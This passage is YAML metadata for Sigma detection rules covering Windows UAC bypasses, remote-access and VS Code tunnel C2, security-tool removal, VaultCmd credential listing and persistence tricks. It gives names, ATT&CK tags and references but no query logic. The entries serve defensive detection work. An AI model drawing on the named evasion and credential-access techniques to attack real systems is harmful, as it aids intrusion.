  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_fodhelper.yml
  name: Bypass UAC via Fodhelper.exe
  description: Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries
    use this technique to execute privileged processes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://eqllib.readthedocs.io/en/latest/analytics/e491ce22-792f-11e9-8f5c-d46d6d62a49e.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1548.002/T1548.002.md
  false_positives:
  - Legitimate use of fodhelper.exe utility by legitimate user
  notes: ''
- detection_id: e52cb31c-10ed-4aea-bcb7-593c9f4a315b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_hijacking_firwall_snap_in.yml
  name: UAC Bypass via Windows Firewall Snap-In Hijack
  description: Detects attempts to bypass User Account Control (UAC) by hijacking
    the Microsoft Management Console (MMC) Windows Firewall snap-in
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/uac-bypass-via-windows-firewall-snap-in-hijack.html#uac-bypass-via-windows-firewall-snap-in-hijack
  false_positives:
  - Unknown
  notes: ''
- detection_id: 49f2f17b-b4c8-4172-a68b-d5bf95d05130
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_icmluautil.yml
  name: UAC Bypass via ICMLuaUtil
  description: Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/uac-bypass-via-icmluautil-elevated-com-interface.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4cbef972-f347-4170-b62a-8253f6168e6d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_idiagnostic_profile.yml
  name: UAC Bypass Using IDiagnostic Profile
  description: Detects the "IDiagnosticProfileUAC" UAC bypass technique
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1548.002
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/Wh04m1001/IDiagnosticProfileUAC
  false_positives:
  - Unknown
  notes: ''
- detection_id: 80fc36aa-945e-4181-89f2-2f907ab6775d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_ieinstal.yml
  name: UAC Bypass Using IEInstal - Process
  description: Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: ad92e3f9-7eb6-460e-96b1-582b0ccbb980
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_msconfig_gui.yml
  name: UAC Bypass Using MSConfig Token Modification - Process
  description: Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe
    55)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 39ed3c80-e6a1-431b-9df3-911ac53d08a7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_ntfs_reparse_point.yml
  name: UAC Bypass Using NTFS Reparse Point - Process
  description: Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe
    DLL hijacking (UACMe 36)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: a743ceba-c771-4d75-97eb-8a90f7f4844c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_pkgmgr_dism.yml
  name: UAC Bypass Using PkgMgr and DISM
  description: Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe
    23)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 40f9af16-589d-4984-b78d-8c2aec023197
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_sdclt.yml
  name: Potential UAC Bypass Via Sdclt.EXE
  description: A General detection for sdclt being spawned as an elevated process.
    This could be an indicator of sdclt being used for bypass UAC techniques.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/6
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4ac47ed3-44c2-4b1f-9d51-bf46e8914126
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_trustedpath.yml
  name: TrustedPath UAC Bypass Pattern
  description: Detects indicators of a UAC bypass method by mocking directories
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548.002
  time_window: ''
  references:
  - https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e
  - https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows
  - https://github.com/netero1010/TrustedPath-UACBypass-BOF
  - https://x.com/Wietze/status/1933495426952421843
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7a01183d-71a2-46ad-ad5c-acd989ac1793
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_winsat.yml
  name: UAC Bypass Abusing Winsat Path Parsing - Process
  description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe
    (UACMe 52)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0058b9e5-bcd7-40d4-9205-95ca5a16d7b2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_wmp.yml
  name: UAC Bypass Using Windows Media Player - Process
  description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll
    (UACMe 32)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: d797268e-28a9-49a7-b9a8-2f5039011c5c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_wsreset.yml
  name: Bypass UAC via WSReset.exe
  description: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries
    use this technique to execute privileged processes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548.002
  time_window: ''
  references:
  - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html
  - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/
  - https://www.activecyber.us/activelabs/windows-uac-bypass
  - https://twitter.com/ReaQta/status/1222548288731217921
  false_positives:
  - Unknown sub processes of Wsreset.exe
  notes: ''
- detection_id: 89a9a0e0-f61a-42e5-8957-b1479565a658
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uac_bypass_wsreset_integrity_level.yml
  name: UAC Bypass WSReset
  description: Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/
  - https://github.com/hfiref0x/UACME
  - https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 145322e4-0fd3-486b-81ca-9addc75736d8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ultravnc.yml
  name: Use of UltraVNC Remote Access Software
  description: An adversary may use legitimate desktop support and remote access software,to
    establish an interactive command and control channel to target systems within
    networks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1219/T1219.md
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 871b9555-69ca-4993-99d3-35a59f9f3599
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ultravnc_susp_execution.yml
  name: Suspicious UltraVNC Execution
  description: Detects suspicious UltraVNC command line flag combination that indicate
    a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon
    threat group)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.005
  tags:
  - attack.lateral-movement
  - attack.g0047
  - attack.t1021.005
  time_window: ''
  references:
  - https://web.archive.org/web/20220224045756/https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine
  - https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution
  - https://uvnc.com/docs/uvnc-viewer/52-ultravnc-viewer-commandline-parameters.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: f0f7be61-9cf5-43be-9836-99d6ef448a18
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_uninstall_crowdstrike_falcon.yml
  name: Uninstall Crowdstrike Falcon Sensor
  description: Adversaries may disable security tools to avoid possible detection
    of their tools and activities by uninstalling Crowdstrike Falcon
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  false_positives:
  - Administrator might leverage the same command line for debugging or other purposes.
    However this action must be always investigated
  notes: ''
- detection_id: 0a98a10c-685d-4ab0-bddc-b6bdd1d48458
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_userinit_uncommon_child_processes.yml
  name: Uncommon Userinit Child Process
  description: Detects uncommon "userinit.exe" child processes, which could be a sign
    of uncommon shells or login scripts used for persistence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1037.001
  tags:
  - attack.privilege-escalation
  - attack.t1037.001
  - attack.persistence
  time_window: ''
  references:
  - https://cocomelonc.github.io/persistence/2022/12/09/malware-pers-20.html
  - https://learn.microsoft.com/en-us/windows-server/administration/server-core/server-core-sconfig#powershell-is-the-default-shell-on-server-core
  false_positives:
  - Legitimate logon scripts or custom shells may trigger false positives. Apply additional
    filters accordingly.
  notes: ''
- detection_id: 58f50261-c53b-4c88-bd12-1d71f12eda4c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vaultcmd_list_creds.yml
  name: Windows Credential Manager Access via VaultCmd
  description: List credentials currently stored in Windows Credential Manager via
    the native Windows utility vaultcmd.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1555.004
  tags:
  - attack.credential-access
  - attack.t1555.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.004/T1555.004.md#atomic-test-1---access-saved-credentials-via-vaultcmd
  false_positives:
  - Unknown
  notes: ''
- detection_id: 921aa10f-2e74-4cca-9498-98f9ca4d6fdf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vbscript_registry_modification.yml
  name: Registry Modification Attempt Via VBScript
  description: 'Detects attempts to modify the registry using VBScript''s CreateObject("Wscript.shell")
    and RegWrite methods via common LOLBINs.

    It could be an attempt to modify the registry for persistence without using straightforward
    methods like regedit.exe, reg.exe, or PowerShell.

    Threat Actors may use this technique to evade detection by security solutions
    that monitor for direct registry modifications through traditional tools.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.005
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.execution
  - attack.t1112
  - attack.t1059.005
  time_window: ''
  references:
  - https://www.linkedin.com/posts/mauricefielenbach_livingofftheland-redteam-persistence-activity-7344801774182051843-TE00/
  - https://www.nextron-systems.com/2025/07/29/detecting-the-most-popular-mitre-persistence-method-registry-run-keys-startup-folder/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d06be4b9-8045-428b-a567-740a26d9db25
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_verclsid_runs_com.yml
  name: Verclsid.exe Runs COM Object
  description: Detects when verclsid.exe is used to run COM object via GUID
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Verclsid/
  - https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5
  - https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/
  false_positives:
  - Unknown
  notes: ''
- detection_id: bab049ca-7471-4828-9024-38279a4c04da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_virtualbox_execution.yml
  name: Virtualbox Driver Installation or Starting of VMs
  description: Adversaries can carry out malicious operations using a virtual instance
    to avoid detection. This rule is built to detect the registration of the Virtualbox
    driver or start of a Virtualbox VM.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564
  - T1564.006
  tags:
  - attack.defense-evasion
  - attack.t1564.006
  - attack.t1564
  time_window: ''
  references:
  - https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/
  - https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/
  false_positives:
  - This may have false positives on hosts where Virtualbox is legitimately being
    used for operations
  notes: ''
- detection_id: b7b19cb6-9b32-4fc4-a108-73f19acfe262
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_virtualbox_vboxdrvinst_execution.yml
  name: Suspicious VBoxDrvInst.exe Parameters
  description: 'Detect VBoxDrvInst.exe run with parameters allowing processing INF
    file.

    This allows to create values in the registry and install drivers.

    For example one could use this technique to obtain persistence via modifying one
    of Run or RunOnce registry keys

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OtherBinaries/VBoxDrvInst.yml
  - https://twitter.com/pabraeken/status/993497996179492864
  false_positives:
  - Legitimate use of VBoxDrvInst.exe utility by VirtualBox Guest Additions installation
    process
  notes: ''
- detection_id: 7aa4e81a-a65c-4e10-9f81-b200eb229d7d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vmware_toolbox_cmd_persistence.yml
  name: Potential Persistence Via VMwareToolBoxCmd.EXE VM State Change Script
  description: Detects execution of the "VMwareToolBoxCmd.exe" with the "script" and
    "set" flag to setup a specific script to run for a specific VM state
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.persistence
  - attack.t1059
  time_window: ''
  references:
  - https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/
  - https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 236d8e89-ed95-4789-a982-36f4643738ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vmware_toolbox_cmd_persistence_susp.yml
  name: Suspicious Persistence Via VMwareToolBoxCmd.EXE VM State Change Script
  description: Detects execution of the "VMwareToolBoxCmd.exe" with the "script" and
    "set" flag to setup a specific script that's located in a potentially suspicious
    location to run for a specific VM state
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.persistence
  - attack.t1059
  time_window: ''
  references:
  - https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5687f942-867b-4578-ade7-1e341c46e99a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vmware_vmtoolsd_susp_child_process.yml
  name: VMToolsd Suspicious Child Process
  description: Detects suspicious child process creations of VMware Tools process
    which may indicate persistence setup
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.persistence
  - attack.t1059
  time_window: ''
  references:
  - https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/
  - https://user-images.githubusercontent.com/61026070/136518004-b68cce7d-f9b8-4e9a-9b7b-53b1568a9a94.png
  - https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/tools.conf
  false_positives:
  - Legitimate use by VM administrator
  notes: ''
- detection_id: 5a3164f2-b373-4152-93cf-090b13c12d27
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vscode_child_processes_anomalies.yml
  name: Potentially Suspicious Child Process Of VsCode
  description: Detects uncommon or suspicious child processes spawning from a VsCode
    "code.exe" process. This could indicate an attempt of persistence via VsCode tasks
    or terminal profiles.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1202
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  - attack.t1202
  time_window: ''
  references:
  - https://twitter.com/nas_bench/status/1618021838407495681
  - https://twitter.com/nas_bench/status/1618021415852335105
  false_positives:
  - In development environment where VsCode is used heavily. False positives may occur
    when developers use task to compile or execute different types of code. Remove
    or add processes accordingly
  notes: ''
- detection_id: 90d6bd71-dffb-4989-8d86-a827fedd6624
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vscode_tunnel_execution.yml
  name: Visual Studio Code Tunnel Execution
  description: Detects Visual Studio Code tunnel execution. Attackers can abuse this
    functionality to establish a C2 channel
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  - T1219
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - attack.t1219
  time_window: ''
  references:
  - https://ipfyx.fr/post/visual-studio-code-tunnel/
  - https://badoption.eu/blog/2023/01/31/code_c2.html
  - https://code.visualstudio.com/docs/remote/tunnels
  false_positives:
  - Legitimate use of Visual Studio Code tunnel
  notes: ''
- detection_id: f4a623c2-4ef5-4c33-b811-0642f702c9f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vscode_tunnel_remote_shell_.yml
  name: Visual Studio Code Tunnel Shell Execution
  description: Detects the execution of a shell (powershell, bash, wsl...) via Visual
    Studio Code tunnel. Attackers can abuse this functionality to establish a C2 channel
    and execute arbitrary commands on the system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://ipfyx.fr/post/visual-studio-code-tunnel/
  - https://badoption.eu/blog/2023/01/31/code_c2.html
  - https://code.visualstudio.com/docs/remote/tunnels
  false_positives:
  - Legitimate use of Visual Studio Code tunnel and running code from there
  notes: ''
- detection_id: 2cf29f11-e356-4f61-98c0-1bdb9393d6da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vscode_tunnel_renamed_execution.yml
  name: Renamed Visual Studio Code Tunnel Execution
  description: Detects renamed Visual Studio Code tunnel execution. Attackers can
    abuse this functionality to establish a C2 channel
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  - T1219
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - attack.t1219
  time_window: ''
  references:
  - https://ipfyx.fr/post/visual-studio-code-tunnel/
  - https://badoption.eu/blog/2023/01/31/code_c2.html
  - https://code.visualstudio.com/docs/remote/tunnels
  false_positives:
  - Unknown
  notes: ''
- detection_id: 30bf1789-379d-4fdc-900f-55cd0a90a801
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vscode_tunnel_service_install.yml
  name: Visual Studio Code Tunnel Service Installation
  description: Detects the installation of VsCode tunnel (code-tunnel) as a service.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://ipfyx.fr/post/visual-studio-code-tunnel/
  - https://badoption.eu/blog/2023/01/31/code_c2.html
  - https://code.visualstudio.com/docs/remote/tunnels
  false_positives:
  - Legitimate installation of code-tunnel as a service
  notes: ''
- detection_id: ac1c92b4-ac81-405a-9978-4604d78cc47e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vsdiagnostics_execution_proxy.yml
  name: Potential Binary Proxy Execution Via VSDiagnostics.EXE
  description: Detects execution of "VSDiagnostics.exe" with the "start" command in
    order to launch and proxy arbitrary binaries.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/0xBoku/status/1679200664013135872
  false_positives:
  - Legitimate usage for tracing and diagnostics purposes
  notes: ''
